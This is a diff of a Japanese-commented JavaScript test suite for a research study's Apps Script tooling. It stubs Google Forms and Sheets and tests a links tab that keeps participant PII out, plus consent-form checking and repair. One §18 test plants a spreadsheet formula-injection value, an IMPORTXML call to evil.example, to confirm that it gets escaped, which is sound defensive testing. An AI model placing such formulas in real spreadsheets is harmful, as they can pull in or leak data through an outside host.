@@ -66,7 +66,20 @@ function makeItem(type) {
       it.__validation = v;
       return it;
     },
-    asMultipleChoiceItem: () => it,
+    isRequired: () => it.__required,
+    // 実物の as…Item() は種類が違うと例外を出す。照合が種類を確かめずに呼ぶ誤りを捕まえるため、同じにする。
+    asTextItem: () => {
+      if (type !== "TEXT") throw new Error("stub: asTextItem on " + type);
+      return it;
+    },
+    asCheckboxItem: () => {
+      if (type !== "CHECKBOX") throw new Error("stub: asCheckboxItem on " + type);
+      return it;
+    },
+    asMultipleChoiceItem: () => {
+      if (type !== "MULTIPLE_CHOICE") throw new Error("stub: asMultipleChoiceItem on " + type);
+      return it;
+    },
     asListItem: () => it,
     asPageBreakItem: () => it,
     setGoToPage: () => it,
@@ -236,21 +249,48 @@ function makeWideSheet(rows) {
         setFontColor: paint("fg"),
         setFontWeight: paint("weight"),
         setHorizontalAlignment: paint("halign"),
+        setWrap: paint("wrap"),
+        // ★ リンク集（2026-10-07）が使う。
+        setValues: (vals) => {
+          vals.forEach((line, i) => {
+            while (data.length < row + i) data.push([]);
+            const dst = data[row - 1 + i];
+            line.forEach((v, j) => {
+              dst[col - 1 + j] = v;
+            });
+          });
+          return rng;
+        },
         getValues: () => {
           const out = [];
           for (let r = row - 1; r < row - 1 + numRows; r++) {
             const src = data[r] || [];
             const line = [];
-            for (let c = col - 1; c < col - 1 + (numCols || 1); c++) line.push(src[c] || "");
+            for (let c = col - 1; c < col - 1 + (numCols || 1); c++) line.push(src[c] === undefined ? "" : src[c]);
             out.push(line);
           }
           return out;
         },
+        // ★ 実物と同じく、表示の文字列で返す（日付は表示の形・数値は文字列）。
+        getDisplayValues: () =>
+          rng.getValues().map((line) =>
+            line.map((v) =>
+              v instanceof Date
+                ? `${v.getFullYear()}/${String(v.getMonth() + 1).padStart(2, "0")}/${String(v.getDate()).padStart(2, "0")}`
+                : String(v)
+            )
+          ),
       };
       return rng;
     },
     appendRow: (r) => {
       data.push(r.slice());
+    },
+    // ★ リンク集（2026-10-07）は毎回作り直す。
+    clear: () => {
+      data.length = 0;
+      sheet.__style = {};
+      sheet.__cleared = (sheet.__cleared || 0) + 1;
     },
   };
   return sheet;
@@ -291,6 +331,7 @@ function makeCtx(opts) {
         PAGE_BREAK: "PAGE_BREAK",
         TEXT: "TEXT",
         CHECKBOX: "CHECKBOX",
+        SECTION_HEADER: "SECTION_HEADER",
       },
       PageNavigationType: { CONTINUE: "CONTINUE" },
       openById: (id) => {
@@ -1261,6 +1302,43 @@ const push = (name, ok, got) => cases.push({ name, ok, got });
       (s) => desc.indexOf(s) >= 0
     ),
     {}
+  );
+}
+
+{
+  // 2026-10-08: 識別子（v0.1.40 の o1_install_id）と、結果の公表・記録の公開の約束。
+  //   配っているアプリ（v0.1.40）が識別子を記録するので、本文に無いまま始めない。
+  //   約束を足したら同意項目も足す（o1ConsentItemTitles_ の注記）。上流の同意文書にも同じ約束がある。
+  const ctx = makeReadyCtx();
+  ctx.buildO1ConsentForm();
+  const desc = ctx.__forms[O1_C].__description;
+  const items = ctx.o1ConsentItemTitles_();
+  const doc = fs.readFileSync(CONSENT_DOC, "utf8");
+  push(
+    "§6 本文に識別子（乱数・16 桁・端末ごとに分けるためだけ）の行がある",
+    desc.indexOf("乱数の識別子（16 桁") >= 0 && desc.indexOf("記録を端末ごとに分けるためだけに使います") >= 0,
+    {}
+  );
+  push("§6 同意文書にも識別子の行がある", doc.indexOf("乱数の識別子（16 桁）") >= 0, {});
+  push(
+    "§6 本文に結果の公表と記録の公開の節がある（取り除けない限界・あらためて尋ねる）",
+    desc.indexOf("▼ 結果の公表と、記録の公開について") >= 0 &&
+      desc.indexOf("公表済みの数値からあなたの分だけを取り除くことはできません") >= 0 &&
+      desc.indexOf("同意をいただけた記録だけを公開します") >= 0,
+    {}
+  );
+  push(
+    "§6 同意文書にも公表と公開の節がある",
+    doc.indexOf("結果の公表と、記録の公開について") >= 0 && doc.indexOf("同意をいただけた記録だけを公開します") >= 0,
+    {}
+  );
+  const iPub = items.findIndex((x) => x.indexOf("公表され") >= 0 && x.indexOf("同意した記録だけが公開される") >= 0);
+  const iKeep = items.findIndex((x) => x.indexOf("保管の上限") >= 0);
+  const iQuit = items.findIndex((x) => x.indexOf("参加はいつでもやめられ") >= 0);
+  push(
+    "§6 公表の同意項目が、保管の上限の直後・やめられるの前にある",
+    iPub >= 0 && iPub === iKeep + 1 && iQuit === iPub + 1,
+    { iKeep, iPub, iQuit }
   );
 }
 
@@ -2698,6 +2776,537 @@ const push = (name, ok, got) => cases.push({ name, ok, got });
   push("§17★ 2 回目は付け直さない（研究者の列幅を戻さない）", log.__widths[5] === 999, { w: log.__widths[5] });
 }
 
+// ============================================================
+// §18 O1 リンク集（2026-10-07・`.steering/20261007-o1-links-tab/`）
+//   ★ 派生の表示なので毎回作り直す。⚠️ 手で入れた欄は保ち、ロスターの ID・PII・秘密は書かない。
+// ============================================================
+const LINKS_TAB = "O1 リンク集";
+const linksText = (ctx) => JSON.stringify(ctx.__sheets[MGMT_ID][LINKS_TAB].__grid);
+const linksValue = (ctx, label) => {
+  const row = ctx.__sheets[MGMT_ID][LINKS_TAB].__grid.find((r) => r[0] === label);
+  return row ? row[1] : undefined;
+};
+function readyWithFormUrls(extra) {
+  const ctx = makeReadyCtx(extra);
+  ctx.__props.FORMURL_O1_CONSENT = JSON.stringify({
+    label: "O1-C", id: O1_C, title: "同意", editUrl: "https://forms.example/c/edit", publishedUrl: "https://forms.example/c/view",
+  });
+  ctx.__props.FORMURL_O1_SURVEY = JSON.stringify({
+    label: "O1-S", id: O1_S, title: "アンケート", editUrl: "https://forms.example/s/edit", publishedUrl: "https://forms.example/s/view",
+  });
+  return ctx;
+}
+{
+  // 陽性対照: フォーム 2 本の回答 URL・編集 URL とアプリの入手先が載る
+  const ctx = readyWithFormUrls();
+  const r = attempt(() => ctx.refreshO1LinksTab());
+  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
+  push("§18 refreshO1LinksTab でリンク集ができる", !r.threw && !!sh, { threw: r.threw, message: r.message });
+  push(
+    "§18★ O1-C / O1-S の回答 URL・編集 URL が載る",
+    linksValue(ctx, "O1-C 説明・同意（参加登録）— 回答 URL") === "https://forms.example/c/view" &&
+      linksValue(ctx, "O1-C — 編集 URL") === "https://forms.example/c/edit" &&
+      linksValue(ctx, "O1-S 終了後アンケート — 回答 URL") === "https://forms.example/s/view" &&
+      linksValue(ctx, "O1-S — 編集 URL") === "https://forms.example/s/edit",
+    { grid: sh && sh.__grid.slice(4, 9) }
+  );
+  push("§18 アプリの入手先が載る", linksValue(ctx, "アプリの入手先（O1_APP_DOWNLOAD_URL）") === "https://drive.example/o1", {});
+  // ★ 研究者依頼（2026-10-07）: 各リンクに「いつ・誰が使うか」を載せる
+  const whenOf = (label) => {
+    const row = sh.__grid.find((r) => r[0] === label);
+    return row ? String(row[3]) : "";
+  };
+  push(
+    "§18★ 全行が 5 列（項目 / 値 / 種別 / いつ・誰が / 備考）で、見出しに「いつ・誰が使うか」がある",
+    sh.__grid.every((r) => r.length === 5) && sh.__grid.some((r) => r[3] === "いつ・誰が使うか"),
+    { lens: [...new Set(sh.__grid.map((r) => r.length))] }
+  );
+  push(
+    "§18★ O1-C は【募集時】・O1-S は「O1 終了判定」タブで終了になった後・アプリは受付メールで届く、と書いてある",
+    /【募集時】/.test(whenOf("O1-C 説明・同意（参加登録）— 回答 URL")) &&
+      /「O1 終了判定」タブが終了（連絡待ち）になった後/.test(whenOf("O1-S 終了後アンケート — 回答 URL")) &&
+      /受付メール/.test(whenOf("アプリの入手先（O1_APP_DOWNLOAD_URL）")),
+    {
+      c: whenOf("O1-C 説明・同意（参加登録）— 回答 URL"),
+      s: whenOf("O1-S 終了後アンケート — 回答 URL"),
+    }
+  );
+  push(
+    "§18 リンクと手で入れる欄のすべてに「いつ・誰が使うか」がある（空にしない）",
+    sh.__grid.filter((r) => ["自動", "手動", "参照"].includes(r[2]) && r[0] !== "更新").every((r) => String(r[3]).length > 0),
+    {}
+  );
+  push("§18 説明の列は折り返す", !!sh.__style["6,4"] && sh.__style["6,4"].wrap === true, { style: sh.__style["6,4"] });
+  // ⚠️★★★ ロスターの ID（氏名・メールへのポインタ）を書かない
+  push("§18★★★ 参加者ロスターの ID を書かない", sh && linksText(ctx).indexOf(ROSTER_ID) < 0, {});
+  push("§18★★ ロスターのメール（PII）を書かない", sh && !/@/.test(linksText(ctx)), {});
+  push("§18 フォームが未生成なら「未生成」と出す（空にしない）", (() => {
+    const c2 = makeReadyCtx();
+    c2.refreshO1LinksTab();
+    return /未生成/.test(String(linksValue(c2, "O1-S 終了後アンケート — 回答 URL")));
+  })(), {});
+}
+{
+  // ★ 手で入れた欄は作り直しても保つ
+  const ctx = readyWithFormUrls();
+  ctx.refreshO1LinksTab();
+  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
+  const row = sh.__grid.findIndex((r) => r[0] === "提出物の受取フォルダ（Drive）");
+  sh.__grid[row][1] = "https://drive.example/inbox";
+  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
+  sh.__grid[memo][1] = "10/8 開始";
+  ctx.__props.O1_APP_DOWNLOAD_URL = "https://drive.example/o1-new";
+  ctx.refreshO1LinksTab();
+  push(
+    "§18★ 作り直しても手で入れた欄（受取フォルダ・メモ）は保ち、自動の欄は新しい値になる",
+    linksValue(ctx, "提出物の受取フォルダ（Drive）") === "https://drive.example/inbox" &&
+      linksValue(ctx, "メモ") === "10/8 開始" &&
+      linksValue(ctx, "アプリの入手先（O1_APP_DOWNLOAD_URL）") === "https://drive.example/o1-new" &&
+      sh.__cleared === 2,
+    { cleared: sh.__cleared }
+  );
+}
+{
+  // ⚠️★ 読み戻した値が `=` で始まる文字列だった場合の防御（★ 実物では数式は表示値で読まれるので、
+  //   ここは「表示値が `=` で始まる」場合の守り。⚠️ 偽シートは文字列をそのまま返す）
+  const ctx = readyWithFormUrls();
+  ctx.refreshO1LinksTab();
+  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
+  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
+  sh.__grid[memo][1] = '=IMPORTXML("https://evil.example","//a")';
+  ctx.refreshO1LinksTab();
+  push("§18★ 読み戻した値が `=` で始まっても数式として書き戻さない（先頭に '）", String(linksValue(ctx, "メモ")).indexOf("'=") === 0, { v: linksValue(ctx, "メモ") });
+}
+{
+  // ★ 日付は表示の形のまま引き継ぐ（⚠️ getValues だと "Thu Oct 08 2026 …" に化ける）
+  const ctx = readyWithFormUrls();
+  ctx.refreshO1LinksTab();
+  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
+  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
+  sh.__grid[memo][1] = new Date(2026, 9, 8);
+  ctx.refreshO1LinksTab();
+  push("§18★ 手で入れた日付は表示の形（2026/10/08）で保つ", linksValue(ctx, "メモ") === "2026/10/08", { v: linksValue(ctx, "メモ") });
+}
+{
+  // ★ 同じ項目名の行が複数あれば、空でない最初の値を採る（⚠️ コピーした空の行で消さない）
+  const ctx = readyWithFormUrls();
+  ctx.refreshO1LinksTab();
+  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
+  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
+  sh.__grid[memo][1] = "最初";
+  sh.__grid.push(["メモ", "", "手動", ""]);
+  sh.__grid.push(["メモ", "後ろ", "手動", ""]);
+  ctx.refreshO1LinksTab();
+  push(
+    "§18★ 同じ項目名が複数: 空でない最初の値を採り、重複をログに出す",
+    linksValue(ctx, "メモ") === "最初" && ctx.__logs.some((l) => /「メモ」の行が複数/.test(l)),
+    { v: linksValue(ctx, "メモ") }
+  );
+  const c2 = readyWithFormUrls();
+  c2.refreshO1LinksTab();
+  const s2 = c2.__sheets[MGMT_ID][LINKS_TAB];
+  const m2 = s2.__grid.findIndex((r) => r[0] === "メモ");
+  s2.__grid[m2][1] = "";
+  s2.__grid.push(["メモ", "下に書いた", "手動", ""]);
+  c2.refreshO1LinksTab();
+  push("§18 同じ項目名が複数: 最初が空なら下の値を採る", linksValue(c2, "メモ") === "下に書いた", { v: linksValue(c2, "メモ") });
+}
+{
+  // ⚠️★★ リンク集が作れなくても、buildO1MgmtSheet はログのタブを用意し、作れていないと肯定形で言う
+  const ctx = readyWithFormUrls({ noMgmtSheet: true });
+  ctx.__sheets[MGMT_ID] = {};
+  ctx.o1BuildLinksTab_ = () => {
+    throw new Error("stub: links failed");
+  };
+  const r = attempt(() => ctx.buildO1MgmtSheet());
+  push(
+    "§18★★ リンク集が投げても build は止まらず、ログ 2 枚はでき、「作れていません」と言う",
+    !r.threw && !!ctx.__sheets[MGMT_ID][MGMT_TAB] && !!ctx.__sheets[MGMT_ID][MGMT_REJECT_TAB] &&
+      ctx.__logs.some((l) => /作れていません/.test(l)),
+    { threw: r.threw, message: r.message }
+  );
+}
+{
+  // ⚠️★★★ 「参加者ロスター」タブを持つ表には書かない
+  const ctx = readyWithFormUrls({ mgmtHasRoster: true });
+  const r = attempt(() => ctx.refreshO1LinksTab());
+  push("§18★★★ ロスタータブを持つ表には書かない（止まる・タブを作らない）", r.threw && !ctx.__sheets[MGMT_ID][LINKS_TAB], { threw: r.threw });
+}
+{
+  // ⚠️★★★ 運営シートの ID が無ければ止まる（★ どこにも書かない）
+  const ctx = readyWithFormUrls({ noMgmtProp: true });
+  const r = attempt(() => ctx.refreshO1LinksTab());
+  push(
+    "§18★ O1_MGMT_SHEET_ID が空なら、表を開く前に理由を言って止まる",
+    r.threw && /O1_MGMT_SHEET_ID が空/.test(r.message) && !ctx.__sheets[MGMT_ID][LINKS_TAB],
+    { threw: r.threw, message: r.message }
+  );
+  // ⚠️★★ 運営シートの ID がロスターと同じ表を指していたら、設定の段階で止まる
+  //   （★ ロスタータブの判定は二重目の守り。一重目が外れても赤になるよう理由の文面で見る）
+  const c2 = readyWithFormUrls({ mgmtSheetId: ROSTER_ID });
+  const r2 = attempt(() => c2.refreshO1LinksTab());
+  push(
+    "§18★★ O1_MGMT_SHEET_ID がロスターと同じ表なら、設定の段階で止まる",
+    r2.threw && /PHASE1_MGMT_SHEET_ID と同じ表/.test(r2.message) && !c2.__sheets[ROSTER_ID][LINKS_TAB],
+    { threw: r2.threw, message: r2.message }
+  );
+}
+{
+  // ⚠️★★★ 登録ログ・却下ログの値を 1 つも変えない（buildO1MgmtSheet 経由でも）
+  const rows = [["2026-09-20 10:00:00", "register", "P001", "ok", "new-pid", "OS: Mac"]];
+  const ctx = readyWithFormUrls({ mgmtRows: rows, mgmtRejectRows: [["2026-09-20 10:01:00", "register", "", "blocked", "bad-pid", ""]] });
+  const reg = JSON.stringify(ctx.__sheets[MGMT_ID][MGMT_TAB].__grid);
+  const rej = JSON.stringify(ctx.__sheets[MGMT_ID][MGMT_REJECT_TAB].__grid);
+  const r = attempt(() => ctx.buildO1MgmtSheet());
+  push(
+    "§18★★★ buildO1MgmtSheet がリンク集も作り、ログ 2 枚の値は不変",
+    !r.threw && !!ctx.__sheets[MGMT_ID][LINKS_TAB] &&
+      JSON.stringify(ctx.__sheets[MGMT_ID][MGMT_TAB].__grid) === reg &&
+      JSON.stringify(ctx.__sheets[MGMT_ID][MGMT_REJECT_TAB].__grid) === rej,
+    { threw: r.threw }
+  );
+}
+
+// ============================================================
+// §19 O1-C の登録用の設問の照合と修復（2026-10-08・`.steering/20261008-o1c-form-missing-fields/`）
+// ============================================================
+// 実物の O1-C が「参加者ID」で終わり、お名前・メールアドレス・パソコンの種類が無かった。
+// 提出は no-email で却下され、参加者には「メールへお送りします」とだけ出ていた。
+// 10/03 の migrateO1ConsentForm は同意項目しか見ずに「フォームはコードと一致しています」と出していた。
+
+/** 構築したあと、末尾の n 個の設問を消した O1-C（実物で見た形を作る）。 */
+function brokenConsentCtx(dropTail, responses) {
+  // 回答 0 件で構築してから回答を入れる（構築は回答があると止まる）。
+  const ctx = makeReadyCtx();
+  ctx.buildO1ConsentForm();
+  const form = ctx.__forms[O1_C];
+  form.__responses = responses === undefined ? 1 : responses;
+  form.__items = form.__items.slice(0, form.__items.length - dropTail);
+  form.__deleted = 0;
+  ctx.__logs.length = 0;
+  return ctx;
+}
+const titlesOf = (form) => form.__items.map((i) => i.__title);
+/** 照合が例外を出したら、それも問題として返す（落ちて検査が止まらないように）。 */
+const shapeProblems = (ctx, form) => {
+  try {
+    return ctx.o1ConsentFormShapeProblems_(form);
+  } catch (e) {
+    return ["THREW: " + String(e && e.message ? e.message : e)];
+  }
+};
+
+{
+  const ctx = brokenConsentCtx(3);
+  const form = ctx.__forms[O1_C];
+  push(
+    "§19 前提: 壊した形は参加者ID で終わる（実物と同じ）",
+    titlesOf(form)[form.__items.length - 1] === ctx.Q_O1_PID,
+    { last: titlesOf(form).slice(-1) }
+  );
+  const before = titlesOf(form).slice();
+  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
+  const after = titlesOf(form);
+  push(
+    "§19 修復は お名前・メールアドレス・パソコンの種類 をこの順で末尾に足す",
+    !r.threw &&
+      r.value === 3 &&
+      JSON.stringify(after) === JSON.stringify(before.concat([ctx.Q_O1_NAME, ctx.Q_O1_EMAIL, ctx.Q_O1_OS])),
+    { threw: r.threw, message: r.message, value: r.value, tail: after.slice(-4) }
+  );
+  push("§19 修復は設問を消さない（回答があるフォーム）", form.__deleted === 0, { deleted: form.__deleted });
+  const byTitle = (t) => form.__items.find((i) => i.__title === t) || {};
+  push(
+    "§19 足した設問は構築と同じ定義（必須・メールの検査・OS の 3 択）",
+    byTitle(ctx.Q_O1_NAME).__required === true &&
+      byTitle(ctx.Q_O1_NAME).__type === "TEXT" &&
+      byTitle(ctx.Q_O1_EMAIL).__required === true &&
+      (byTitle(ctx.Q_O1_EMAIL).__validation || {}).__pattern === ".+@.+" &&
+      byTitle(ctx.Q_O1_OS).__type === "MULTIPLE_CHOICE" &&
+      byTitle(ctx.Q_O1_OS).__required === true &&
+      JSON.stringify(byTitle(ctx.Q_O1_OS).__choices) === JSON.stringify(["Windows", "Mac", "両方使う"]),
+    {}
+  );
+  const pairs = {};
+  pairs[ctx.Q_O1_PID] = "";
+  pairs[ctx.Q_O1_NAME] = "山田";
+  pairs[ctx.Q_O1_EMAIL] = "y@example.com";
+  pairs[ctx.Q_O1_OS] = "Windows";
+  const titlesNow = titlesOf(form);
+  const usable = {};
+  Object.keys(pairs).forEach((t) => {
+    if (titlesNow.indexOf(t) >= 0) usable[t] = pairs[t];
+  });
+  const a = ctx.o1ConsentAnswers_(makeResponse(usable).response);
+  push(
+    "§19 修復した後のフォームから回答取得が name・email・os を取れる（往復）",
+    a.name === "山田" && a.email === "y@example.com" && a.os === "Windows",
+    a
+  );
+  push(
+    "§19 修復した後の照合は問題 0",
+    shapeProblems(ctx, form).length === 0,
+    { problems: shapeProblems(ctx, form) }
+  );
+  const again = attempt(() => ctx.repairO1ConsentRegistrationItems());
+  push("§19 2 回目の修復は何も足さない（冪等）", !again.threw && again.value === 0, again);
+}
+
+{
+  // 4 つとも欠けた形（最後の同意項目と見出しで終わる）でも、正しい順で戻せる。
+  const ctx = brokenConsentCtx(4);
+  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
+  push(
+    "§19 4 つとも欠けていれば 参加者ID から順に 4 つ足す",
+    !r.threw &&
+      r.value === 4 &&
+      JSON.stringify(titlesOf(ctx.__forms[O1_C]).slice(-4)) ===
+        JSON.stringify([ctx.Q_O1_PID, ctx.Q_O1_NAME, ctx.Q_O1_EMAIL, ctx.Q_O1_OS]),
+    { threw: r.threw, message: r.message, value: r.value }
+  );
+}
+
+{
+  // 並びが崩れた形（参加者ID が無く、お名前以降はある）では、末尾に足すと順序が壊れるので止まる。
+  const ctx = makeReadyCtx();
+  ctx.buildO1ConsentForm();
+  const form = ctx.__forms[O1_C];
+  form.__responses = 1;
+  form.__items = form.__items.filter((i) => i.__title !== ctx.Q_O1_PID);
+  const n = form.__items.length;
+  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
+  push(
+    "§19 欠けが後ろ側にまとまっていなければ足さずに止まる",
+    r.threw && form.__items.length === n,
+    { threw: r.threw, message: r.message, items: form.__items.length }
+  );
+}
+
+{
+  // メールアドレスだけが欠け、パソコンの種類が お名前 より前にある。最後の設問は お名前 なので
+  // 最後の設問の検査は通る。欠けが後ろ側にまとまっているかの検査だけが止める形。
+  const ctx = makeReadyCtx();
+  ctx.buildO1ConsentForm();
+  const form = ctx.__forms[O1_C];
+  form.__responses = 1;
+  const name = form.__items.find((i) => i.__title === ctx.Q_O1_NAME);
+  const os = form.__items.find((i) => i.__title === ctx.Q_O1_OS);
+  form.__items = form.__items
+    .filter((i) => i !== name && i !== os && i.__title !== ctx.Q_O1_EMAIL)
+    .concat([os, name]);
+  const n = form.__items.length;
+  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
+  push(
+    "§19 最後の設問が合っていても、並びが崩れていれば止まる",
+    r.threw && form.__items.length === n,
+    { threw: r.threw, message: r.message }
+  );
+}
+
+{
+  // 登録用の設問の後ろに見出しが付いている。照合は見出しを見ないので、最後の設問の検査だけが止める形。
+  const ctx = brokenConsentCtx(3);
+  const form = ctx.__forms[O1_C];
+  form.addSectionHeaderItem().setTitle("後から付いた見出し");
+  push("§19 前提: この形は照合では問題 0", shapeProblems(ctx, form).filter((p) => p.indexOf("欠けている") < 0).length === 0, {
+    problems: shapeProblems(ctx, form),
+  });
+  const n = form.__items.length;
+  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
+  push(
+    "§19 登録用の設問の後ろに見出しがあれば足さずに止まる",
+    r.threw && form.__items.length === n,
+    { threw: r.threw, message: r.message }
+  );
+}
+
+{
+  // 登録用の設問の後ろに別の設問がある（migrate で同意項目が末尾に付いた等）なら止まる。
+  const ctx = brokenConsentCtx(3);
+  const form = ctx.__forms[O1_C];
+  form.addCheckboxItem().setTitle("後から付いた同意項目");
+  const n = form.__items.length;
+  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
+  push(
+    "§19 最後の設問が登録用でなければ足さずに止まる",
+    r.threw && form.__items.length === n,
+    { threw: r.threw, message: r.message }
+  );
+}
+
+{
+  // 照合（読み取り専用）
+  const ok = makeReadyCtx();
+  ok.buildO1ConsentForm();
+  const okForm = ok.__forms[O1_C];
+  const p0 = attempt(() => ok.o1ConsentFormShapeProblems_(okForm));
+  push("§19 構築直後の照合は問題 0（陽性対照）", !p0.threw && p0.value.length === 0, p0);
+
+  const ctx = brokenConsentCtx(3);
+  const form = ctx.__forms[O1_C];
+  const snap = JSON.stringify(form.__items.map((i) => [i.__type, i.__title, i.__required]));
+  const res = attempt(() => ctx.checkO1ConsentFormShape());
+  push(
+    "§19 欠けたフォームで照合は false を返し、欠けた 3 つを名指しする",
+    !res.threw &&
+      res.value === false &&
+      [ctx.Q_O1_NAME, ctx.Q_O1_EMAIL, ctx.Q_O1_OS].every((t) => ctx.__logs.join("\n").indexOf(t) >= 0),
+    { threw: res.threw, message: res.message, value: res.value, logs: ctx.__logs.slice(0, 6) }
+  );
+  push(
+    "§19 照合はフォームを変更しない",
+    JSON.stringify(form.__items.map((i) => [i.__type, i.__title, i.__required])) === snap && form.__deleted === 0,
+    {}
+  );
+  const okRes = attempt(() => ok.checkO1ConsentFormShape());
+  push("§19 正しいフォームで照合は true を返す", !okRes.threw && okRes.value === true, okRes);
+}
+
+{
+  // 種類違い・必須の違い・順序違いも挙げる。
+  const mk = () => {
+    const c = makeReadyCtx();
+    c.buildO1ConsentForm();
+    return c;
+  };
+  const c1 = mk();
+  c1.__forms[O1_C].__items.find((i) => i.__title === c1.Q_O1_EMAIL).__required = false;
+  push(
+    "§19 照合: メールアドレスが必須でなければ挙げる",
+    shapeProblems(c1, c1.__forms[O1_C]).some((p) => p.indexOf(c1.Q_O1_EMAIL) >= 0),
+    { problems: shapeProblems(c1, c1.__forms[O1_C]) }
+  );
+  const c2 = mk();
+  const f2 = c2.__forms[O1_C];
+  const iName = f2.__items.findIndex((i) => i.__title === c2.Q_O1_NAME);
+  const iMail = f2.__items.findIndex((i) => i.__title === c2.Q_O1_EMAIL);
+  const tmp = f2.__items[iName];
+  f2.__items[iName] = f2.__items[iMail];
+  f2.__items[iMail] = tmp;
+  push(
+    "§19 照合: お名前とメールアドレスの順序が逆なら挙げる",
+    shapeProblems(c2, f2).length > 0,
+    { problems: shapeProblems(c2, f2) }
+  );
+  const c3 = mk();
+  const f3 = c3.__forms[O1_C];
+  const firstCheck = f3.__items.find((i) => i.__type === "CHECKBOX");
+  f3.__items = f3.__items.filter((i) => i !== firstCheck);
+  push(
+    "§19 照合: 同意項目が 1 つ欠けても挙げる",
+    shapeProblems(c3, f3).some((p) => p.indexOf(firstCheck.__title) >= 0),
+    { problems: shapeProblems(c3, f3) }
+  );
+  const c4 = mk();
+  const f4 = c4.__forms[O1_C];
+  const osIdx = f4.__items.findIndex((i) => i.__title === c4.Q_O1_OS);
+  const fake = makeItem("TEXT");
+  fake.__title = c4.Q_O1_OS;
+  fake.__required = true;
+  f4.__items[osIdx] = fake;
+  push(
+    "§19 照合: パソコンの種類が選択式でなければ挙げる",
+    shapeProblems(c4, f4).some((p) => p.indexOf(c4.Q_O1_OS) >= 0),
+    { problems: shapeProblems(c4, f4) }
+  );
+}
+
+{
+  // code-reviewer LOW（2026-10-08）: 選択肢・重複・既存の並びの崩れ
+  const mk = () => {
+    const c = makeReadyCtx();
+    c.buildO1ConsentForm();
+    return c;
+  };
+  const c1 = mk();
+  c1.__forms[O1_C].__items.find((i) => i.__title === c1.Q_O1_OS).__choices = ["Windows", "macOS", "両方使う"];
+  push(
+    "§19 照合: パソコンの種類の選択肢が違えば挙げる",
+    shapeProblems(c1, c1.__forms[O1_C]).some((p) => p.indexOf("選択肢") >= 0),
+    { problems: shapeProblems(c1, c1.__forms[O1_C]) }
+  );
+  const c2 = mk();
+  const f2 = c2.__forms[O1_C];
+  const dup = makeItem("TEXT");
+  dup.__title = c2.Q_O1_NAME;
+  dup.__required = true;
+  f2.__items.push(dup);
+  push(
+    "§19 照合: 同じタイトルの設問が 2 つあれば挙げる",
+    shapeProblems(c2, f2).some((p) => p.indexOf("2 つ以上") >= 0 && p.indexOf(c2.Q_O1_NAME) >= 0),
+    { problems: shapeProblems(c2, f2) }
+  );
+  // [..., 参加者ID, 同意X(後から付いた), お名前, メールアドレス] は最後の設問と後ろ側の検査を通るが、
+  // 足しても一致しない。足す前に止まる。
+  const c3 = mk();
+  const f3 = c3.__forms[O1_C];
+  f3.__responses = 1;
+  const pidIdx = f3.__items.findIndex((i) => i.__title === c3.Q_O1_PID);
+  const stray = makeItem("CHECKBOX");
+  stray.__title = "後から付いた同意項目";
+  stray.__required = true;
+  f3.__items.splice(pidIdx + 1, 0, stray);
+  f3.__items = f3.__items.filter((i) => i.__title !== c3.Q_O1_OS);
+  const n3 = f3.__items.length;
+  const r3 = attempt(() => c3.repairO1ConsentRegistrationItems());
+  push(
+    "§19 修復: 欠け以外の問題が足す前からあれば足さずに止まる",
+    r3.threw && f3.__items.length === n3 && (r3.message || "").indexOf("後から付いた同意項目") >= 0,
+    { threw: r3.threw, message: r3.message }
+  );
+}
+
+{
+  // cross-review（Codex・2026-10-08）: プロトタイプのキー名のタイトルと、登録用と同名の見出し
+  const c1 = makeReadyCtx();
+  c1.buildO1ConsentForm();
+  const f1 = c1.__forms[O1_C];
+  const odd = makeItem("TEXT");
+  odd.__title = "constructor";
+  f1.__items.push(odd);
+  push(
+    "§19 照合: タイトルが constructor の設問も「コードに無い設問」として挙げる",
+    shapeProblems(c1, f1).some((p) => p.indexOf("コードに無い設問: constructor") >= 0),
+    { problems: shapeProblems(c1, f1) }
+  );
+  // …参加者ID → パソコンの種類 → 見出し「参加者ID…」で、お名前とメールアドレスが欠けている形
+  const c2 = makeReadyCtx();
+  c2.buildO1ConsentForm();
+  const f2 = c2.__forms[O1_C];
+  f2.__responses = 1;
+  f2.__items = f2.__items.filter((i) => i.__title !== c2.Q_O1_NAME && i.__title !== c2.Q_O1_EMAIL);
+  f2.addSectionHeaderItem().setTitle(c2.Q_O1_PID);
+  const n2 = f2.__items.length;
+  const r2 = attempt(() => c2.repairO1ConsentRegistrationItems());
+  push(
+    "§19 修復: 最後が登録用と同名の見出しなら足さずに止まる",
+    r2.threw && f2.__items.length === n2,
+    { threw: r2.threw, message: r2.message }
+  );
+}
+
+{
+  // 10/03 の誤報の回帰: 同意項目が揃っていても、登録用が欠けていれば「一致しています」と言わない。
+  const ctx = brokenConsentCtx(3);
+  const r = attempt(() => ctx.migrateO1ConsentForm());
+  const log = ctx.__logs.join("\n");
+  push(
+    "§19 migrate は登録用が欠けたフォームで「一致しています」と言わず、欠けを出す",
+    !r.threw && r.value === 0 && log.indexOf("一致しています") < 0 && log.indexOf(ctx.Q_O1_EMAIL) >= 0,
+    { threw: r.threw, message: r.message, logs: ctx.__logs }
+  );
+  const ok = makeReadyCtx();
+  ok.buildO1ConsentForm();
+  ok.__forms[O1_C].__responses = 1;
+  ok.__logs.length = 0;
+  ok.migrateO1ConsentForm();
+  push(
+    "§19 migrate は正しいフォームでは一致と言う（陽性対照）",
+    ok.__logs.join("\n").indexOf("一致しています") >= 0,
+    { logs: ok.__logs }
+  );
+}
+
 let ng = 0;
 cases.forEach((c) => {
   if (!c.ok) ng++;
@@ -2709,9 +3318,10 @@ cases.forEach((c) => {
 //   ★ 45 のままだと実数 89 に対して**半分近く削っても緑**で、「削られていないか」を測れていない。
 // ⚠️★ 実数に近づけて保つ（★ 2026-09-03: §13〜§16 を足して 221 件なので下限 215）。
 //   ⚠️ 離れたままだと「テストが 13 件消えても気づかない」状態になる。
